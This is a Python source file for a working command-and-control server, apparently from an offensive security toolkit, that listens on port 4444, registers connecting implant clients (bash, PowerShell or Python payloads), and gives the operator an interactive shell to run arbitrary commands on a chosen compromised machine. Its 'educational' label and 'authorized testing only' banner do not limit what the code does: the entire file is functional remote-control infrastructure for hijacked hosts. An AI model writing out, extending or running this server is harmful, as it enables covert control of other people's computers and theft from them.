#!/usr/bin/env python3
"""
Command & Control Server Module
Educational demonstration of C2 architecture
"""

import socket
import threading
import json
import time
import os
from datetime import datetime
from colorama import Fore, Style

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = False
        self.server_socket = None
        self.current_client = None
        self.client_responses = {}
        self.response_lock = threading.Lock()
        
    def print_banner(self):
        """Print C2 server banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║              {Fore.YELLOW}Command & Control Server{Fore.CYAN}                  ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.RED}WARNING: Use only for authorized security testing!{Fore.CYAN}        ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
        
    def handle_client(self, client_socket, address):
        """Handle individual client connections"""
        client_id = f"{address[0]}:{address[1]}"
        self.clients[client_id] = {
            'socket': client_socket,
            'address': address,
            'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Initialize response storage
        with self.response_lock:
            self.client_responses[client_id] = None
        
        print(f"\n{Fore.GREEN}[+] New client connected: {client_id}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total clients: {len(self.clients)}{Style.RESET_ALL}")
        
        # If no current client is selected, auto-select this one
        if self.current_client is None:
            self.current_client = client_id
            print(f"{Fore.YELLOW}[*] Auto-selected client: {client_id}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] You can now type commands directly!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Type 'help' for commands or 'back' to return to menu{Style.RESET_ALL}\n")
        
        try:
            while self.running:
                # Receive data from client
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                try:
                    message = json.loads(data)
                    self.clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    if message.get('type') == 'heartbeat':
                        # Silent heartbeat - don't spam console
                        pass
                    elif message.get('type') == 'response':
                        # Store response for the interactive shell
                        with self.response_lock:
                            self.client_responses[client_id] = message.get('data', '')
                        # Print response immediately
                        print(f"\n{Fore.GREEN}[{client_id}] {Style.RESET_ALL}{message.get('data', 'No data')}")
                        # Show prompt again if this is the current client
                        if self.current_client == client_id:
                            print(f"{Fore.CYAN}[C2-Shell@{client_id}]{Fore.YELLOW} > {Style.RESET_ALL}", end='', flush=True)
                    else:
                        print(f"{Fore.CYAN}[*] Message from {client_id}: {message}{Style.RESET_ALL}")
                        
                except json.JSONDecodeError:
                    # Handle raw text responses (for bash/powershell payloads)
                    with self.response_lock:
                        self.client_responses[client_id] = data
                    print(f"\n{Fore.GREEN}[{client_id}] {Style.RESET_ALL}{data}")
                    if self.current_client == client_id:
                        print(f"{Fore.CYAN}[C2-Shell@{client_id}]{Fore.YELLOW} > {Style.RESET_ALL}", end='', flush=True)
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Error handling client {client_id}: {e}{Style.RESET_ALL}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            with self.response_lock:
                if client_id in self.client_responses:
                    del self.client_responses[client_id]
            client_socket.close()
            print(f"\n{Fore.RED}[-] Client disconnected: {client_id}{Style.RESET_ALL}")
            if self.current_client == client_id:
                self.current_client = None
                if self.clients:
                    # Auto-select another client if available
                    self.current_client = list(self.clients.keys())[0]
                    print(f"{Fore.YELLOW}[*] Switched to client: {self.current_client}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[*] No clients connected{Style.RESET_ALL}")
    
    def send_command(self, client_id, command, show_sent=True):
        """Send command to a specific client"""
        if client_id not in self.clients:
            print(f"{Fore.RED}[!] Client {client_id} not found{Style.RESET_ALL}")
            return False
            
        try:
            # Clear previous response
            with self.response_lock:
                self.client_responses[client_id] = None
            
            # Send command as JSON (Python payloads will parse it)
            # Payloads are updated to handle both JSON and raw commands
            message = json.dumps({
                'type': 'command',
                'command': command,
                'timestamp': datetime.now().isoformat()
            })
            self.clients[client_id]['socket'].send(message.encode('utf-8'))
            
            if show_sent:
                print(f"{Fore.CYAN}[*] Executing: {command}{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error sending command: {e}{Style.RESET_ALL}")
            return False
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print(f"{Fore.YELLOW}[*] No clients connected{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    {Fore.YELLOW}Connected Clients{Fore.CYAN}                  ║")
        print(f"╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        
        for idx, (client_id, info) in enumerate(self.clients.items(), 1):
            print(f"{Fore.CYAN}║  {Fore.GREEN}[{idx}]{Fore.CYAN} {client_id:<30} {info['connected_at']:<20} ║{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    def interactive_shell(self):
        """Interactive command shell - Direct CMD control"""
        while self.running:
            try:
                # Wait a bit for clients to connect
                time.sleep(0.5)
                
                # If we have a current client, show shell prompt
                if self.current_client and self.current_client in self.clients:
                    try:
                        cmd = input(f"{Fore.CYAN}[C2-Shell@{self.current_client}]{Fore.YELLOW} > {Style.RESET_ALL}").strip()
                    except EOFError:
                        break
                    
                    if not cmd:
                        continue
                    
                    # Handle special commands
                    if cmd.lower() == 'back':
                        break
                    elif cmd.lower() == 'help':
                        self.show_help()
                    elif cmd.lower() == 'list':
                        self.list_clients()
                    elif cmd.lower().startswith('select '):
                        parts = cmd.split(' ', 1)
                        if len(parts) == 2:
                            client_id = parts[1]
                            if client_id in self.clients:
                                self.current_client = client_id
                                print(f"{Fore.GREEN}[+] Switched to client: {client_id}{Style.RESET_ALL}")
                            else:
                                print(f"{Fore.RED}[!] Client not found: {client_id}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[!] Usage: select <client_id>{Style.RESET_ALL}")
                    elif cmd.lower() == 'status':
                        print(f"{Fore.CYAN}[*] Server Status:{Style.RESET_ALL}")
                        print(f"    Host: {self.host}")
                        print(f"    Port: {self.port}")
                        print(f"    Clients: {len(self.clients)}")
                        print(f"    Current: {self.current_client}")
                        print(f"    Running: {self.running}")
                    elif cmd.lower() == 'clear':
                        os.system('cls' if os.name == 'nt' else 'clear')
                    else:
                        # Send command directly to current client
                        self.send_command(self.current_client, cmd, show_sent=False)
                        # Wait a moment for response
                        time.sleep(0.1)
                
                elif self.clients:
                    # We have clients but no current selection
                    self.current_client = list(self.clients.keys())[0]
                    print(f"{Fore.YELLOW}[*] Auto-selected client: {self.current_client}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] You can now type commands directly!{Style.RESET_ALL}\n")
                else:
                    # No clients connected, show waiting message
                    time.sleep(1)
                    if not hasattr(self, '_waiting_shown'):
                        print(f"{Fore.YELLOW}[*] Waiting for client connection...{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Type 'back' to return to main menu{Style.RESET_ALL}\n")
                        self._waiting_shown = True
                    
                    # Check for back command even when waiting
                    try:
                        import select
                        import sys
                        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                            line = sys.stdin.readline().strip()
                            if line.lower() == 'back':
                                break
                    except:
                        pass
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    def show_help(self):
        """Show C2 server help"""
        help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    {Fore.YELLOW}C2 Shell Commands{Fore.CYAN}                    ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  {Fore.GREEN}Direct Commands:{Fore.CYAN}                                    ║
║    Just type any command and press Enter to execute it      ║
║    on the connected client (e.g., 'dir', 'ls', 'whoami')   ║
║                                                              ║
║  {Fore.GREEN}Special Commands:{Fore.CYAN}                                   ║
║    {Fore.GREEN}list{Fore.CYAN}              - List all connected clients     ║
║    {Fore.GREEN}select <id>{Fore.CYAN}       - Switch to different client     ║
║    {Fore.GREEN}status{Fore.CYAN}            - Show server status             ║
║    {Fore.GREEN}clear{Fore.CYAN}              - Clear screen                  ║
║    {Fore.GREEN}help{Fore.CYAN}              - Show this help                ║
║    {Fore.GREEN}back{Fore.CYAN}              - Return to main menu           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(help_text)
    
    def start_server(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"{Fore.GREEN}[+] C2 Server started on {self.host}:{self.port}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Waiting for client connections...{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] When a client connects, you'll get direct CMD control!{Style.RESET_ALL}\n")
            
            # Start interactive shell in a separate thread
            shell_thread = threading.Thread(target=self.interactive_shell, daemon=True)
            shell_thread.start()
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"{Fore.RED}[!] Error accepting connection: {e}{Style.RESET_ALL}")
                        
        except Exception as e:
            print(f"{Fore.RED}[!] Error starting server: {e}{Style.RESET_ALL}")
        finally:
            self.stop_server()
    
    def stop_server(self):
        """Stop the C2 server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print(f"\n{Fore.YELLOW}[*] C2 Server stopped{Style.RESET_ALL}")
    
    def run(self):
        """Run the C2 server interface"""
        self.print_banner()
        
        port_input = input(f"{Fore.YELLOW}[*] Enter port (default 4444): {Style.RESET_ALL}").strip()
        if port_input:
            try:
                self.port = int(port_input)
            except ValueError:
                print(f"{Fore.RED}[!] Invalid port, using default 4444{Style.RESET_ALL}")
        
        try:
            self.start_server()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping server...{Style.RESET_ALL}")
            self.stop_server()

